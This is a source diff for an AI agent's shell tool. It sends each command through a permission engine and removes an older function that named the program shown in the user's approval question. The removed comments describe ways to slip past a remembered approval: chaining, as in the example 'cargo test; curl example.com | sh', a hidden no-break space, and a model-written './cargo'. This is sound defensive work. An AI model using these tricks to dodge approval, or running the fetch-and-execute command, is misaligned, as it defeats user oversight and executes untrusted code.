@@ -4,14 +4,22 @@
 //! pipes and redirection without this file growing a shell of its own. Nothing
 //! here confines what runs: a shell can reach anything the user can, which is
 //! why every call comes through the permission engine and why the question the
-//! user is asked names the program.
+//! user is asked names the command.
+//!
+//! A rule can be written about a command, so the line has to be read far enough
+//! to say what it will run — that is [`command`], which recognises the shapes a
+//! rule can honestly cover and refuses the rest. Refusing means being asked.
 
+mod command;
 mod output;
+mod wrapper;
 
-use std::process::{Command, Stdio};
+use std::process::Stdio;
 use std::time::Duration;
 
-use crucible_core::{Cancel, Grant, Sensitivity, Tool, ToolArgs, ToolError, ToolOutput, Workspace};
+use crucible_core::{
+    Approved, Cancel, Sensitivity, Tool, ToolArgs, ToolError, ToolOutput, Workspace,
+};
 
 use crate::args::Args;
 
@@ -99,24 +107,22 @@ impl Tool for Bash {
     }
 
     fn sensitivity(&self, args: &ToolArgs) -> Sensitivity {
-        let named = match Args::parse(NAME, args)
+        let command = match Args::parse(NAME, args)
             .and_then(|args| args.text("command").map(str::to_owned))
         {
-            Ok(command) => program(&command).to_owned(),
+            Ok(line) => command::read(&line),
             // A call this malformed will be refused by `run`, but it still has
             // to be given a sensitivity first — and the safe answer to "what is
-            // about to run" when the answer cannot be read is everything that
-            // was sent, not the first word of it.
-            Err(_) => args.as_str().to_owned(),
+            // about to run" when nobody can read it is everything that was
+            // sent, reported as unreadable.
+            Err(_) => crucible_core::Command::Opaque(args.as_str().into()),
         };
 
-        Sensitivity::SpawnsProcess {
-            program: named.into(),
-        }
+        Sensitivity::SpawnsProcess { command }
     }
 
-    fn run(&self, args: ToolArgs, _grant: Grant) -> Result<ToolOutput, ToolError> {
-        let args = Args::parse(NAME, &args)?;
+    fn run(&self, approved: Approved) -> Result<ToolOutput, ToolError> {
+        let args = Args::parse(NAME, approved.args())?;
         let command = args.text("command")?;
         let seconds = args.count("timeout", SECONDS)?;
 
@@ -130,7 +136,7 @@ impl Tool for Bash {
             return Err(ToolError::Cancelled(NAME));
         }
 
-        let child = Command::new("sh")
+        let child = std::process::Command::new("sh")
             .arg("-c")
             .arg(command)
             .current_dir(self.workspace.root())
@@ -151,43 +157,6 @@ impl Tool for Bash {
         let allowed = Duration::from_secs(u64::try_from(seconds).unwrap_or(60));
 
         output::collect(child, allowed, &self.cancel)
-    }
-}
-
-/// What is about to run, for the question the user is asked and for what a
-/// session-wide allow remembers.
-///
-/// A command that chains, pipes or redirects is reported whole. Its first word
-/// does not describe what it does, and remembering `cargo` from `cargo test`
-/// would then also allow `cargo test; curl example.com | sh`.
-///
-/// The word is reported as the model wrote it, path and all. `cargo` and
-/// `./cargo` are different programs, and a remembered grant that could not tell
-/// them apart would run any file of that name the model had just written.
-fn program(command: &str) -> &str {
-    // The shell's separators, which are not Rust's: `char::is_whitespace`
-    // follows Unicode and would treat a no-break space as one of these.
-    const IFS: [char; 3] = [' ', '\t', '\n'];
-
-    let command = command.trim_matches(IFS);
-
-    if command.contains([';', '|', '&', '`', '\n', '(', '>', '<']) {
-        return command;
-    }
-
-    // Any other whitespace stays inside the word as far as `sh` is concerned,
-    // so the text before it is a prefix of what runs rather than the name of
-    // it. `./build\u{a0}x` would otherwise be announced — and remembered by an
-    // `always` — as `./build`, while a second binary is what executes.
-    if command.contains(|c: char| c.is_whitespace() && !IFS.contains(&c)) {
-        return command;
-    }
-
-    match command.split(IFS).find(|word| !word.is_empty()) {
-        // A leading `VAR=value` decides which binary the word after it
-        // resolves to, so that word on its own no longer says what will run.
-        Some(word) if !word.contains('=') => word,
-        _ => command,
     }
 }
 
